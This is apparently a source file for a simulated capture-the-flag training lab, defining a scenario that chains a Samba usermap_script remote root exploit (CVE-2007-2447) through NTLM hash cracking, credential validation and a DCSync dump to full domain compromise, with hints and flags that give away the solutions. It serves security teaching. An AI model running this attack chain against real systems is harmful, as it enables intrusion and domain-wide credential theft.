import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

export const redteamToolsLabs: LabScenario[] = [
  {
    id: 'msf-samba-usermap-domain-pivot',
    title: 'Metasploit Framework: Samba usermap_script RCE to Domain Compromise',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'MegaCorp\'s file server (lame-fileshare, 10.10.116.2) is still running the Samba 3.0.20-Debian package with ' +
      '"username map script" enabled — the exact configuration behind CVE-2007-2447, one of the most-used ' +
      'introductory Metasploit modules ever written (exploit/multi/samba/usermap_script), because a malformed ' +
      'username is passed unsanitized into a shell command by smbd, which runs as root. This lab walks the full ' +
      'msfconsole workflow for that module, then treats the resulting root shell the way a real operator would: ' +
      'as a base to loot credential material and pivot deeper into the network with the rest of the standard Kali ' +
      'toolkit — hashcat, CrackMapExec, and secretsdump — rather than stopping at the first foothold.',
    objectives: [
      {
        text: 'nmap -sV 10.10.116.2',
        why: 'The banner "Samba smbd 3.0.20-Debian (username map script enabled)" is the exact fingerprint real operators (and Metasploitable2 walkthroughs) look for before ever touching msfconsole — you confirm the vulnerable configuration before spending a single exploit attempt.',
      },
      {
        text: "In msfconsole: search samba usermap_script; use exploit/multi/samba/usermap_script; set RHOSTS 10.10.116.2; run — modeled here as: exploit samba-usermap-script 10.10.116.2",
        why: 'This is a real, extremely well-documented Metasploit module: it abuses smbd\'s "username map script" feature to inject shell metacharacters into a username field, which smbd — running as root — passes straight to a shell. No credentials, no chaining, no privilege escalation step required: the very first packet lands you root.',
      },
      {
        text: 'cat root.txt to confirm the root shell, then exit back to your attack box',
        why: 'Confirms the exploit actually landed a working root shell rather than just reporting success, and returns you to your own Kali box — hashcat and your wordlists live there, not on the box you just popped.',
      },
      {
        text: 'cat dc-admin.hash — review the NTLM hash looted from this engagement\'s earlier recon',
        why: 'Real engagements rarely end at one box: a hash captured from this file server (password reuse from an old domain password-reset ticket) is exactly the kind of loot that turns a single low-value target into a path toward the domain controller.',
      },
      {
        text: 'hashcat -m 1000 dc-admin.hash wordlists/mini-rockyou.txt',
        why: 'Mode 1000 is NTLM. Cracking this offline, rather than trying the hash directly against services that expect a plaintext password, is standard operator practice — and it works here in seconds because the password is a common dictionary word.',
      },
      {
        text: 'crackmapexec smb 10.10.116.3 -u Administrator -p <cracked-password>',
        why: 'Validate a recovered credential against the target before committing to a noisier action like a full DCSync — this is the same operational hygiene taught throughout this platform\'s Active Directory labs, applied here to a domain controller instead of a service account.',
      },
      {
        text: 'secretsdump Administrator:<cracked-password>@10.10.116.3',
        why: 'With a validated Administrator credential, this mirrors Impacket\'s real secretsdump DCSync technique: asking the DC to "replicate" its own NTDS.DIT credential database to you. This is the actual endpoint of the engagement — full domain compromise, starting from one misconfigured Samba service.',
      },
    ],
    hints: [
      'nmap -sV 10.10.116.2 — look closely at the Samba version string on port 139/445.',
      'The real msfconsole sequence is: search samba usermap_script → use exploit/multi/samba/usermap_script → set RHOSTS 10.10.116.2 → run. In this simulated terminal, that entire chain is one command: exploit samba-usermap-script 10.10.116.2',
      'You are now root on lame-fileshare. cat root.txt for the first flag, then exit to return to your Kali attack box.',
      'Back on your attack box: cat dc-admin.hash to see the looted NTLM hash and which host it belongs to.',
      'hashcat -m 1000 dc-admin.hash wordlists/mini-rockyou.txt — mode 1000 is NTLM, and the password is a common dictionary word.',
      'crackmapexec smb 10.10.116.3 -u Administrator -p dragon — validate the cracked password before using it for anything noisier.',
      'secretsdump Administrator:dragon@10.10.116.3 — full DCSync, mirroring the real Impacket technique. The Administrator line in the dump is your final flag.',
    ],
    totalFlags: 3,
    attacker: attacker({
      'dc-admin.hash': file(
        '#HASHCAT_HASH:8846f7eaee8fb117ad06bdd830b7586c\n#HASHCAT_PLAINTEXT:dragon\n#HASHCAT_FLAG:flag{ntlm_hash_cracked_password_reuse_across_domain}\n' +
          'Captured NTLM hash for MEGACORP\\Administrator, recovered from lame-fileshare (10.10.116.2) — reused ' +
          'across the domain from an old password-reset ticket nobody rotated afterward.\n' +
          'Target: 10.10.116.3 (MEGACORP-DC)\n' +
          'Hash type: NTLM (mode 1000)\n',
      ),
      wordlists: dir({ 'mini-rockyou.txt': file('123456\npassword\ndragon\nletmein\nqwerty\nsummer2024\ntrustno1\n') }),
    }),
    network: [
      {
        hostname: 'lame-fileshare',
        ip: '10.10.116.2',
        os: 'Ubuntu 8.04 (Metasploitable2-style legacy file server)',
        exploitableAs: 'samba-usermap-script',
        services: [
          { port: 21, name: 'ftp', version: 'vsftpd 2.3.4' },
          { port: 139, name: 'netbios-ssn', version: 'Samba smbd 3.0.20-Debian (username map script enabled)' },
          { port: 445, name: 'microsoft-ds', version: 'Samba smbd 3.0.20-Debian (username map script enabled)' },
        ],
        users: [],
        root: dir({
          root: dir({
            'root.txt': file(
              'CVE-2007-2447 confirmed — smbd\'s "username map script" option passed an attacker-controlled ' +
                'username straight into a shell command, running as root with zero authentication required.\n' +
                'flag{samba_usermap_script_cve_2007_2447_unauth_root}\n',
            ),
          }),
        }),
      } as HostDef,
      {
        hostname: 'MEGACORP-DC',
        ip: '10.10.116.3',
        os: 'Windows Server 2016 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' }],
        users: [{ username: 'Administrator', password: 'dragon', canDcsync: true }],
        ntdsHashes:
          'megacorp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:flag{samba_foothold_to_domain_admin_full_compromise}:::\n' +
          'megacorp.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        root: dir({}),
      } as HostDef,
    ],
  },
];
